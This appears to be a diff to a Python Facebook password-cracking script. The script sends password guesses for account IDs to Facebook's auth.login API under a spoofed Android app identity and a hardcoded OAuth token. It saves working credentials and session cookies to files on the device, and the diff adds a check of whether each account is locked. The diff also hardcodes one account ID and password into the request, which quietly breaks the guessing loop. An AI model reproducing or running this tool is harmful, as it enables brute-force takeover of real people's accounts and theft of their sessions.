@@ -6,6 +6,8 @@ from os import system as clr
 import random
 import string 
 from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+from bs4 import BeautifulSoup as bxx
 import re
 import sys
 import uuid
@@ -103,7 +105,7 @@ def method_crack(ids,passlist):
             sys.stdout.flush()
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
-            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': '100094384432402', 'password': '121234', 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
             header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
@@ -112,8 +114,10 @@ def method_crack(ids,passlist):
                     uid=reqx['uid']
                 except:
                     uid=ids
-                if str(uid) in oks:
+                    ckkx=lock_check(uid)
+                if ckkx =='LOCK':
                     break
+                   #Lock show hobe 
                 else:
                     print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
@@ -121,6 +125,7 @@ def method_crack(ids,passlist):
                     open('/sdcard/PING-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
+                    #ok id show hobe 
             elif 'www.facebook.com' in reqx['error_msg']:
                 print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
                 open('/sdcard/PING-CP.txt','a').write(ids+'|'+pas+'\n')
@@ -131,5 +136,15 @@ def method_crack(ids,passlist):
         loop+=1
     except:
         pass
+#---------------lock check def--------------#
+def lock_check(uid):
+	sessionx=requests.Session()
+	urlx=f'https://www.facebook.com/p/{uid}'
+	req=bxx(sessionx.get(urlx). content,'html.parser')
+	tx=req.find('title').text
+	if tx =='Facebook':
+		return('LOCK')
+	else:
+		return('LIVE')
 #-------------end----------------#
 MR_DIPTO()
